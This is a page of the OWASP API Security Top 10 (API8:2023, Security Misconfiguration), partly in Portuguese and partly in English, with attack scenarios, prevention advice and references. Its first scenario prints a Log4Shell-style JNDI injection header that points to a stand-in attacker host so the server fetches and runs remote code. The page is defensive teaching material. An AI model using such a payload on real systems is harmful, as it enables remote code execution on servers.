# API8:2023 Security Misconfiguration

| Agentes Ameaça/Vetores Ataque | Falha Segurança | Impactos |
| - | - | - |
| Específico da API : Abuso **Fácil** | Prevalência **Predominante** : Detectability **Fácil** | Técnico **Severo** : Específico do Negócio |
| Os atacantes frequentemente tentam encontrar falhas não corrigidas, _endpoints_ comuns, serviços a funcionar com configurações padrão inseguras ou arquivos e diretórios não protegidos para obter acesso não autorizado ou conhecimento do sistema. A maior parte disto é conhecimento público e os _exploits_ podem estar disponíveis. | A má configuração de segurança pode ocorrer em qualquer nível da API, desde o nível da rede até o nível da aplicação. Ferramentas automatizadas estão disponíveis para detectar e explorar más configurações, como serviços desnecessários ou opções antigas. | As más configurações de segurança não expõem apenas dados sensíveis dos utilizadores, mas também detalhes do sistema que podem levar a um compromisso total do servidor. |

## A API é vulnerável?

A API pode ser vulnerável se:

* As devidas proteções de segurança não foram aplicadas em qualquer parte da
  API, ou se houver permissões mal configuradas em serviços de nuvem.
* Os últimos _patches_ de segurança estão em falta ou os sistemas estão
  desatualizados.
* Funcionalidades desnecessárias estão ativadas (por exemplo, verbos HTTP,
  funcionalidades de registo de eventos).
* Existem discrepâncias na forma como os pedidos são processados pelos
  servidores na cadeia de servidores HTTP.
* A Segurança da Camada de Transporte (TLS) está em falta.
* Diretivas de segurança ou de controlo de cache não são enviadas aos clientes.
* Uma política de Partilha de Recursos entre Origens (CORS) está em falta ou mal
  configurada.
* As mensagens de erro incluem _stack traces_ ou expõem outras informações
  sensíveis.

## Exemplos de Cenários de Ataque

### Cenário #1

Um servidor de API _back-end_ mantém um registo de acesso escrito por uma 
utilidade de registo _open-source_ popular de terceiros, com suporte para 
expansão de espaços reservados e pesquisas JNDI (Java Naming and Directory 
Interface), ambos ativados por defeito. Para cada pedido, uma nova entrada é 
escrita no ficheiro de registo com o seguinte padrão: 
`<method> <api_version>/<path> - <status_code>`.

Um ator malicioso emite o seguinte pedido de API, que é escrito no ficheiro de
registo de acesso:

```
GET /health
X-Api-Version: ${jndi:ldap://attacker.com/Malicious.class}
```

Devido à configuração padrão insegura da utilidade de registo e a uma política 
de rede de saída permissiva, para escrever a entrada correspondente no registo 
de acesso, ao expandir o valor no cabeçalho `X-Api-Version` do pedido, a 
utilidade de registo irá buscar e executar o objeto `Malicious.class` do 
servidor controlado remotamente pelo atacante.

### Cenário #2

A social network website offers a "Direct Message" feature that allows users to
keep private conversations. To retrieve new messages for a specific
conversation, the website issues the following API request (user interaction is
not required):

```
GET /dm/user_updates.json?conversation_id=1234567&cursor=GRlFp7LCUAAAA
```

Because the API response does not include the `Cache-Control` HTTP response
header, private conversations end-up cached by the web browser, allowing
malicious actors to retrieve them from the browser cache files in the
filesystem.

## How To Prevent

The API life cycle should include:

* A repeatable hardening process leading to fast and easy deployment of a
  properly locked down environment
* A task to review and update configurations across the entire API stack. The
  review should include: orchestration files, API components, and cloud
  services (e.g. S3 bucket permissions)
* An automated process to continuously assess the effectiveness of the
  configuration and settings in all environments

Furthermore:

* Ensure that all API communications from the client to the API server and any
  downstream/upstream components happen over an encrypted communication channel
  (TLS), regardless of whether it is an internal or public-facing API.
* Be specific about which HTTP verbs each API can be accessed by: all other
  HTTP verbs should be disabled (e.g. HEAD).
* APIs expecting to be accessed from browser-based clients (e.g., WebApp
  front-end) should, at least:
  * implement a proper Cross-Origin Resource Sharing (CORS) policy
  * include applicable Security Headers
* Restrict incoming content types/data formats to those that meet the business/
  functional requirements.
* Ensure all servers in the HTTP server chain (e.g. load balancers, reverse
  and forward proxies, and back-end servers) process incoming requests in a
  uniform manner to avoid desync issues.
* Where applicable, define and enforce all API response payload schemas,
  including error responses, to prevent exception traces and other valuable
  information from being sent back to attackers.

## References

### OWASP

* [OWASP Secure Headers Project][1]
* [Configuration and Deployment Management Testing - Web Security Testing
  Guide][2]
* [Testing for Error Handling - Web Security Testing Guide][3]
* [Testing for Cross Site Request Forgery - Web Security Testing Guide][4]

### External

* [CWE-2: Environmental Security Flaws][5]
* [CWE-16: Configuration][6]
* [CWE-209: Generation of Error Message Containing Sensitive Information][7]
* [CWE-319: Cleartext Transmission of Sensitive Information][8]
* [CWE-388: Error Handling][9]
* [CWE-444: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response
  Smuggling')][10]
* [CWE-942: Permissive Cross-domain Policy with Untrusted Domains][11]
* [Guide to General Server Security][12], NIST
* [Let's Encrypt: a free, automated, and open Certificate Authority][13]

[1]: https://owasp.org/www-project-secure-headers/
[2]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/README
[3]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README
[4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
[5]: https://cwe.mitre.org/data/definitions/2.html
[6]: https://cwe.mitre.org/data/definitions/16.html
[7]: https://cwe.mitre.org/data/definitions/209.html
[8]: https://cwe.mitre.org/data/definitions/319.html
[9]: https://cwe.mitre.org/data/definitions/388.html
[10]: https://cwe.mitre.org/data/definitions/444.html
[11]: https://cwe.mitre.org/data/definitions/942.html
[12]: https://csrc.nist.gov/publications/detail/sp/800-123/final
[13]: https://letsencrypt.org/
